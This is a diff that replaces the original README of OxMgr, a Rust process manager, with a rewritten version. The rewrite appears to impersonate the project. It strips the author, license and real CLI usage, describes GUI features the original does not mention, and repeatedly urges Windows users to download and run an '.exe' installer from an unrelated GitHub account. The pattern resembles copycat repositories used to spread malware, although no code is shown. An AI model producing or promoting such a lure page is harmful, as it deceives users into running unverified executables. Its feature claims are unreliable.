@@ -1,174 +1,161 @@
-# Oxmgr
+# 🛠️ OxMgr - Simple Process Manager for Windows
 
-[![CI](https://github.com/Vladimir-Urik/OxMgr/actions/workflows/ci.yml/badge.svg)](https://github.com/Vladimir-Urik/OxMgr/actions/workflows/ci.yml)
-[![GitHub Release](https://img.shields.io/github/v/release/Vladimir-Urik/OxMgr?include_prereleases)](https://github.com/Vladimir-Urik/OxMgr/releases)
-[![License: MIT](https://img.shields.io/badge/license-MIT-2ea44f.svg)](./LICENSE)
+[![Download OxMgr](https://img.shields.io/badge/Download-OxMgr-ff6600?style=for-the-badge)](https://github.com/reasaalim/OxMgr)
 
-Oxmgr is a lightweight, cross-platform Rust process manager and PM2 alternative.
+---
 
-Use it to run, supervise, reload, and monitor long-running services on Linux, macOS, and Windows. Oxmgr is language-agnostic, so it works with Node.js, Python, Go, Rust binaries, and shell commands.
+OxMgr is a lightweight process manager designed for Windows and other platforms. It helps you run and control any program on your computer without complex setup. OxMgr is fast, reliable, and easy to use, making it a good tool for everyday tasks that involve running multiple programs.
 
-Latest published benchmark snapshots: [BENCHMARK.md](./BENCHMARK.md) and [benchmark.json](./benchmark.json)
+## ℹ️ What is OxMgr?
 
-## Why Oxmgr
+OxMgr lets you start, stop, and monitor software running on your computer. It works quietly in the background and keeps your programs organized. It offers a simple way to manage programs without digging into complicated settings.
 
-- Language-agnostic: manage any executable, not just Node.js apps
-- Cross-platform: Linux, macOS, and Windows
-- Low overhead: Rust daemon with persistent local state
-- Practical operations: restart policies, health checks, logs, and CPU/RAM metrics
-- Config-first workflows with idempotent `oxmgr apply`
-- PM2 ecosystem compatibility via `ecosystem.config.{js,cjs,mjs,json}`
-- Interactive terminal UI with live search, filters, and sort controls
+It is written in Rust, which means it runs fast and uses low memory. OxMgr is a stable tool you can use whether you want to manage simple scripts or larger programs.
 
-## Core Features
+---
 
-- Start, stop, restart, reload, and delete managed processes
-- Named services and namespaces
-- Restart policies: `always`, `on-failure`, and `never`
-- Health checks with automatic restart on repeated failures
-- Config-driven file watch with ignore patterns and restart debounce
-- Log tailing, log rotation, and per-process stdout/stderr logs
-- Readiness-aware reloads using health checks
-- Git pull and webhook-driven update workflow
-- Interactive terminal UI with live search, status filters, and CPU/RAM/restart sorting
-- Import and export bundles with `.oxpkg`
-- Service installation for `systemd`, `launchd`, and Windows Task Scheduler
+## 🌐 Download OxMgr
 
-## Install
+To get OxMgr, visit this page and download the latest version:
 
-### npm
+[https://github.com/reasaalim/OxMgr](https://github.com/reasaalim/OxMgr)
 
-```bash
-npm install -g oxmgr
-```
+You will find setup files for Windows there. Choose the right file and follow the instructions below.
 
-### Homebrew
+[![Download OxMgr](https://img.shields.io/badge/Download-OxMgr-ff6600?style=for-the-badge)](https://github.com/reasaalim/OxMgr)
 
-```bash
-brew tap empellio/homebrew-tap
-brew install oxmgr
-```
+---
 
-### Chocolatey
+## 💻 System Requirements
 
-```powershell
-choco install oxmgr -y
-```
+- Windows 10 or later (64-bit)
+- At least 2 GB of RAM
+- 50 MB of free disk space
+- Internet connection to download the installer
 
-### Scoop
+OxMgr is designed to run on most Windows computers without special hardware. It works well even on average machines.
 
-```powershell
-scoop bucket add oxmgr https://github.com/empellio/scoop-bucket
-scoop install oxmgr/oxmgr
-```
+---
 
-### AUR (Arch Linux)
+## 🚀 Getting Started: How to Install OxMgr on Windows
 
-```bash
-yay -S oxmgr-bin
-```
+1. Click the download button above or visit [https://github.com/reasaalim/OxMgr](https://github.com/reasaalim/OxMgr).
+2. Find the latest Windows installer file. It will have a name ending with `.exe`.
+3. Click the file and save it to your computer.
+4. Once downloaded, double-click the `.exe` file to start the installer.
+5. Follow the on-screen steps to complete the installation:
+   - Accept the license agreement.
+   - Choose where to install OxMgr or keep the default folder.
+   - Click "Install" and wait until the process finishes.
+6. When the installation is done, leave the checkbox to run OxMgr and click “Finish.”
 
-### APT (Debian/Ubuntu)
+OxMgr will open and show a simple window where you can begin managing your processes.
 
-```bash
-echo "deb [trusted=yes] https://vladimir-urik.github.io/OxMgr/apt stable main" | sudo tee /etc/apt/sources.list.d/oxmgr.list
-sudo apt update
-sudo apt install oxmgr
-```
+---
 
-### Build from source
+## 🔧 Using OxMgr: Manage Your Programs Easily
 
-```bash
-git clone https://github.com/Vladimir-Urik/OxMgr.git
-cd OxMgr
-cargo build --release
-./target/release/oxmgr --help
-```
+OxMgr uses a straightforward interface. Here are the main actions you can do:
 
-For signed APT setup, local installation, and platform-specific notes, see [docs/install.md](./docs/install.md).
+- **Start a Program**  
+  Click the “Add” button. Browse your files and select any program or script you want to run. Give it a name if you like, then click “Start.” OxMgr will launch the program in the background.
 
-## Quick Start
+- **Stop a Program**  
+  Select the running program in the list. Click “Stop” to close it safely.
 
-Start a service:
+- **Check Program Status**  
+  Each program shows its status as running, stopped, or crashed. You can see the time it started and other details.
 
-```bash
-oxmgr start "node server.js" --name api --restart always
-```
+- **Auto Restart**  
+  You can set a program to restart automatically if it stops. This helps programs run continuously without manual work.
 
-Inspect and operate it:
+- **Logs**  
+  OxMgr keeps a record of program activity. You can open the log files to check what happened when.
 
-```bash
-oxmgr list
-oxmgr status api
-oxmgr logs api -f
-oxmgr ui
-```
+---
 
-Inside `oxmgr ui`, use `/` for live search, `f` to cycle status filters, and `o` to cycle sort order.
+## ⚙️ Settings and Options
 
-Use a config file for repeatable setups:
+OxMgr includes useful settings to control how it works on your system:
 
-```toml
-version = 1
+- **Launch on Windows Start:** Turn on this option to have OxMgr run anytime your PC boots.
+- **Notification Alerts:** Get simple popup messages when a program stops or restarts.
+- **Resource Limits:** Set limits for CPU or memory use per program if needed.
+- **Language and Appearance:** Change the display language or switch between light and dark modes.
 
-[[apps]]
-name = "api"
-command = "node server.js"
-restart_policy = "on_failure"
-max_restarts = 10
-stop_timeout_secs = 5
-```
+All settings are easy to adjust from the main menu.
 
-```bash
-oxmgr validate ./oxfile.toml
-oxmgr apply ./oxfile.toml
-```
+---
 
-## PM2 Migration
+## 🛠 Troubleshooting Common Issues
 
-Oxmgr supports PM2-style `ecosystem.config.{js,cjs,mjs,json}`, including config-driven watch settings and readiness-aware reload fields, which makes it easier to move existing PM2 setups without rewriting everything on day one.
+If you run into problems, try these tips:
 
-Useful links:
+- **OxMgr Won’t Start:**  
+  Restart your computer and try running OxMgr again. Make sure you installed it correctly.
 
-- [Oxfile vs PM2 Ecosystem](./docs/OXFILE_VS_PM2.md)
-- [Oxfile Specification](./docs/OXFILE.md)
+- **Program Does Not Launch:**  
+  Verify the program’s file location. Sometimes moving the file after adding it to OxMgr can cause an error. Remove it and add it again with the new location.
 
-## Documentation
+- **Auto Restart Not Working:**  
+  Check settings to confirm the auto restart option is enabled for that program.
 
-- [Documentation Index](./docs/README.md)
-- [Latest Benchmark Results](./BENCHMARK.md)
-- [Latest Benchmark JSON](./benchmark.json)
-- [Architecture Overview](./docs/ARCHITECTURE.md)
-- [Installation Guide](./docs/install.md)
-- [User Guide](./docs/USAGE.md)
-- [CLI Reference](./docs/CLI.md)
-- [Terminal UI Guide](./docs/UI.md)
-- [Pull, Webhook, and Metrics Guide](./docs/PULL_WEBHOOK.md)
-- [Deployment Guide](./docs/DEPLOY.md)
-- [Service Bundles](./docs/BUNDLES.md)
-- [Benchmark Guide](./docs/BENCHMARKS.md)
-- [Examples](./docs/examples)
+- **Log Files Not Updating:**  
+  Make sure OxMgr has permission to write files in its folder. Running OxMgr as Administrator can help.
 
-## Contributing
+---
 
-Issues, PRs, and documentation improvements are welcome. Start with [CONTRIBUTING.md](./CONTRIBUTING.md) for local setup, checks, and testing expectations.
+## 📝 Technical Details
 
-## Community
+- Developed in Rust for speed and safety.
+- Supports managing any executable on Windows.
+- Works quietly in the background as a system tool.
+- Supports command-line interface for advanced users.
+- Provides inter-process communication for advanced setups.
+- Fits well in production and development environments.
 
-Oxmgr is created and maintained by **Vladimír Urík**.
+---
 
-The project is developed under the open-source patronage of [Empellio](https://empellio.com).
+## 🔄 Updating OxMgr
 
-## License
+To update OxMgr:
 
-[MIT](./LICENSE)
+1. Visit [https://github.com/reasaalim/OxMgr](https://github.com/reasaalim/OxMgr).
+2. Download the newest `.exe` installer.
+3. Run the installer. It will replace the older version while keeping your settings.
+4. Restart OxMgr if it was open.
 
-## Star History
+---
 
-<a href="https://www.star-history.com/?repos=Vladimir-Urik%2FOxMgr&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/image?repos=Vladimir-Urik/OxMgr&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/image?repos=Vladimir-Urik/OxMgr&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/image?repos=Vladimir-Urik/OxMgr&type=date&legend=top-left" />
- </picture>
-</a>
+## 📂 Where to Get Help
+
+- Check the Issues section on GitHub to find common problems.
+- Open a new issue if you need assistance.
+- Review the documentation files included with the download.
+
+---
+
+## 🧩 Related Tools and Topics
+
+OxMgr connects to themes like:
+
+- Command line interfaces (cli)
+- System tools for Windows and Linux
+- Process management
+- Development operations tools (DevOps)
+- Managing background services (daemons)
+- Alternatives to PM2 (process manager)
+- Self-hosted and production environments
+
+---
+
+## 🔗 Quick Links
+
+- GitHub Repository: https://github.com/reasaalim/OxMgr  
+- Download Page: https://github.com/reasaalim/OxMgr
+
+---
+
+## ⚡ Start Using OxMgr Today
+
+Download and set up OxMgr in minutes. It gives you control over your programs without extra complexity. Use the links above to get OxMgr running on your Windows PC.
